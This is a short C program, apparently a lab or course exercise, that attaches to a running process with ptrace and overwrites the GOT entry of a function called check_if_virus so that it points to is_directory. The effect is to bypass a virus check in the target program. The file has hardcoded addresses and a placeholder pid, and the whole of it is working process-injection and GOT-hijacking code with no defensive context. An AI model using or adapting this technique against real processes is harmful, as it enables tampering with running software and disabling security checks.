#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


#include <stdio.h>
#include <stdlib.h>
int pid = 0x99999999;




int main() 
{

if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
 {  // Attach to the process
  perror("attach ");
  return;
 }



int status;
waitpid(pid, &status, 0);  // Wait for the process to stop
if (WIFEXITED(status)) { return; }  // Abort if the process exits

	//address of got entry of check_if_virus:0x0804A01C
	
	//address of is_directory:0x804878b

	//this is the address of the GOT entry
	void * addr =(void *)0x0804A01C;
	


	long data=0x0804878b;

	//changing the redirection address in the GOT of check_if_virus to is_drectory()
	if(ptrace(PTRACE_POKETEXT, pid, addr, (void *)data))
	{
	  perror("poke");
	  return;
	}

	



if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) 
{  // Detach when done
  perror("detach");
  return;
}

}
